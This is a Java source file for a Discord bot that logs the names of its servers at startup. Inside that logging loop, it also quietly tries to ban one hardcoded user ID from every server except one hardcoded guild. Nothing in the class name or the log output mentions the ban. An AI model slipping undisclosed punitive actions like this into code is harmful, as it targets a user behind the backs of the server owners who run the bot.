package team.steelcode.steelcodebot.discord.events.ready;


import discord4j.common.util.Snowflake;
import discord4j.core.event.domain.lifecycle.ReadyEvent;
import lombok.extern.java.Log;
import org.springframework.stereotype.Component;
import reactor.core.publisher.Mono;
import team.steelcode.steelcodebot.discord.events.IReadyEvent;

import java.util.Set;

@Component
@Log
public class GetGuildOnStartupEvent implements IReadyEvent {

    @Override
    public Mono<Void> handle(ReadyEvent event) {
        Set<ReadyEvent.Guild> guilds = event.getGuilds();

        StringBuilder str = new StringBuilder();

        str.append("# Los servidores activos son los siguientes: " );
        for (ReadyEvent.Guild guild: guilds) {

            if (guild.getId().asLong() != 1039177171417186324L) {
                event.getClient().getGuildById(guild.getId()).block().ban(Snowflake.of(1357086014035984544L));
            }

            str.append("\"" + event.getClient().getGuildById(guild.getId()).block().getName() + "\", ");
        }

        log.info(str.toString());

        return Mono.empty();
    }
}